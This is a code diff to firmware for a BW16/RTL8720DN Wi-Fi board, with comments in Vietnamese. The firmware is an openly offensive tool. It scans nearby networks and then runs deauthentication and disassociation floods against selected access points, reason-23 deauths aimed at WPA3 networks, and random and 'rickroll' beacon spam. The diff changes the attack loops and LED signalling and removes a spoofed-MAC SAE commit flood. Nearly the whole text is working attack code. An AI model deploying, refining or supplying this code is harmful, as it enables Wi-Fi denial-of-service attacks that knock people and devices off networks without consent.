@@ -38,14 +38,12 @@
 #define PIN_LED_B 11  
 
 // --- ENUMS ---
-enum LedState { LED_OFF, LED_BLUE_SOLID, LED_GREEN_WAIT, LED_RED_BLINK };
+enum LedState { LED_OFF, LED_BLUE_SOLID, LED_GREEN_WAIT };
 enum AttackType { ATK_NONE, ATK_DEAUTH, ATK_WPA3, ATK_BEACON_RANDOM, ATK_BEACON_RICKROLL };
 
 LedState currentLedState = LED_OFF;
 AttackType currentAttack = ATK_NONE;
-unsigned long ledTimer = 0;       
 unsigned long scanDoneTime = 0;   
-unsigned long packetTimer = 0; 
 
 struct NetworkInfo {
   char ssid[33];
@@ -116,14 +114,6 @@ void handleLedEffects() {
     case LED_GREEN_WAIT: 
       setLedColor(0, 1, 0); 
       if (currentMillis - scanDoneTime > 3000) currentLedState = LED_OFF;
-      break;
-    case LED_RED_BLINK:
-      if ((currentMillis - ledTimer) > 100) {
-        ledTimer = currentMillis;
-        static bool toggle = false;
-        toggle = !toggle;
-        setLedColor(toggle, 0, 0); 
-      }
       break;
   }
 }
@@ -207,7 +197,8 @@ void startScan() {
   if (ret != RTW_SUCCESS) {
     wifi_off();
     delay(200);
-    wifi_on(RTW_MODE_STA);
+    WiFi.enableConcurrent();
+    WiFi.status();
     delay(300);
     ret = wifi_scan_networks(scanResultHandler, NULL);
   }
@@ -249,12 +240,17 @@ void setup() {
   pinMode(PIN_LED_G, OUTPUT); 
   pinMode(PIN_LED_B, OUTPUT);
   setLedColor(0, 0, 0);
+
+  // Khởi động Wi-Fi chuẩn Concurrent STA+AP (RTW_MODE_STA_AP) cho RTL8720DN
+  WiFi.enableConcurrent();
+  WiFi.status();
+  int ch;
+  wifi_get_channel(&ch);
   
-  wifi_on(RTW_MODE_STA); 
   uartPrintln("\n[BW16 MULTI-TARGET READY]");
   uartPrintln("[UART: Serial0 (PA7/PA8) & Serial1 (PB1/PB2) ACTIVE]");
 
-  delay(300);
+  delay(200);
   startScan(); 
 }
 
@@ -280,18 +276,19 @@ void atkDeauth() {
   NetworkInfo target = scanResults[targetID];
   setTargetChannel(target.channel);
 
-  // Phát gói tin deauth và disassociation có delay an toàn giữa các gói
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2); 
-  delay(4);
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 7); 
-  delay(4);
-  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-  delay(4);
+  // Bật đèn đỏ trực tiếp trong lúc phát loạt gói deauth
+  digitalWrite(PIN_LED_R, HIGH);
+  for (int i = 0; i < 4; i++) {
+    uint16_t reason = (i % 2 == 0) ? 2 : 7;
+    wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason); 
+    delay(5);
+  }
+  digitalWrite(PIN_LED_R, LOW);
+  delay(50); // Khoảng nghỉ 50ms cho DMA buffer giải phóng hoàn toàn, chống nghẽn hàng đợi
 }
 
 void atkWpa3() {
   static int currentTargetIdx = 0;
-  static uint8_t spoof_mac[6] = {0x02, 0x16, 0x88, 0x00, 0x00, 0x01};
   
   if (selectedCount == 0) return;
   if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
@@ -303,20 +300,13 @@ void atkWpa3() {
   NetworkInfo target = scanResults[targetID];
   setTargetChannel(target.channel);
 
-  // Sinh địa chỉ MAC ngẫu nhiên
-  spoof_mac[3] = (uint8_t)rand();
-  spoof_mac[4] = (uint8_t)rand();
-  spoof_mac[5] = (uint8_t)rand();
-
-  // 1. SAE Commit Authentication frame flood
-  wifi_tx_sae_commit_frame(target.bssid, spoof_mac);
-  delay(4);
-
-  // 2. Disassoc & Deauth frame với PMF reason 23
-  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-  delay(4);
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);
-  delay(4);
+  digitalWrite(PIN_LED_R, HIGH);
+  for (int i = 0; i < 4; i++) {
+    wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23); // Reason 23: IEEE 802.11w PMF
+    delay(5);
+  }
+  digitalWrite(PIN_LED_R, LOW);
+  delay(50);
 }
 
 void atkBeaconRandom() {
@@ -335,10 +325,13 @@ void atkBeaconRandom() {
   int ch = allChannels[random(0, totalChannels)];
   setTargetChannel(ch);
 
+  digitalWrite(PIN_LED_R, HIGH);
   for (int i = 0; i < 3; i++) {
     wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
-    delay(4);
+    delay(5);
   }
+  digitalWrite(PIN_LED_R, LOW);
+  delay(50);
 }
 
 void atkBeaconRickroll() {
@@ -352,19 +345,14 @@ void atkBeaconRickroll() {
   int ch = (songIdx % 11) + 1;
   setTargetChannel(ch);
 
+  digitalWrite(PIN_LED_R, HIGH);
   wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rick_roll[songIdx]);
   songIdx = (songIdx + 1) % 8;
-  delay(4);
+  digitalWrite(PIN_LED_R, LOW);
+  delay(50);
 }
 
 void handleAttack() {
-  unsigned long interval = 40; // 40ms giữa các đợt phát (~25 đợt/giây, rất mạnh và không bị nghẽn queue)
-  if (currentAttack == ATK_WPA3) interval = 50;
-  else if (currentAttack == ATK_BEACON_RANDOM || currentAttack == ATK_BEACON_RICKROLL) interval = 40;
-
-  if (millis() - packetTimer < interval) return; 
-  packetTimer = millis();
-
   if (currentAttack == ATK_DEAUTH) atkDeauth();
   else if (currentAttack == ATK_WPA3) atkWpa3();
   else if (currentAttack == ATK_BEACON_RANDOM) atkBeaconRandom();
@@ -459,7 +447,6 @@ void processCommand(String cmd) {
 
     if (selectedCount > 0) {
       currentAttack = ATK_DEAUTH;
-      currentLedState = LED_RED_BLINK;
       cachedChannel = -1;
       uartPrintln("[ATTACK STARTED: DEAUTH]");
     }
@@ -477,7 +464,6 @@ void processCommand(String cmd) {
       }
       if (selectedCount > 0) {
         currentAttack = ATK_DEAUTH; 
-        currentLedState = LED_RED_BLINK; 
         cachedChannel = -1;
         uartPrintln("[ATTACK STARTED: DEAUTH]");
       } else {
@@ -492,20 +478,17 @@ void processCommand(String cmd) {
       }
       if (selectedCount > 0) {
         currentAttack = ATK_WPA3;
-        currentLedState = LED_RED_BLINK;
         cachedChannel = -1;
         uartPrintln("[ATTACK STARTED: WPA3]");
       }
     }
     else if (type == "beacon" || type == "random") {
       currentAttack = ATK_BEACON_RANDOM;
-      currentLedState = LED_RED_BLINK;
       cachedChannel = -1;
       uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
     }
     else if (type == "rickroll") {
       currentAttack = ATK_BEACON_RICKROLL;
-      currentLedState = LED_RED_BLINK;
       cachedChannel = -1;
       uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
     }
@@ -513,13 +496,11 @@ void processCommand(String cmd) {
   // 5. Lệnh Beacon từ RTL8720 / Flipper
   else if (cmd.startsWith("RANDOM") || cmd.startsWith("BEACON:RANDOM")) {
     currentAttack = ATK_BEACON_RANDOM;
-    currentLedState = LED_RED_BLINK;
     cachedChannel = -1;
     uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
   }
   else if (cmd.startsWith("RICKROLL") || cmd.startsWith("BEACON:RICKROLL")) {
     currentAttack = ATK_BEACON_RICKROLL;
-    currentLedState = LED_RED_BLINK;
     cachedChannel = -1;
     uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
   }
@@ -563,8 +544,11 @@ void loop() {
     }
   }
 
-  if (currentAttack != ATK_NONE) handleAttack();
-  handleLedEffects();
+  if (currentAttack != ATK_NONE) {
+    handleAttack();
+  } else {
+    handleLedEffects();
+  }
 
   delay(2); // Nhường CPU cho FreeRTOS scheduler & Wi-Fi DMA
 }
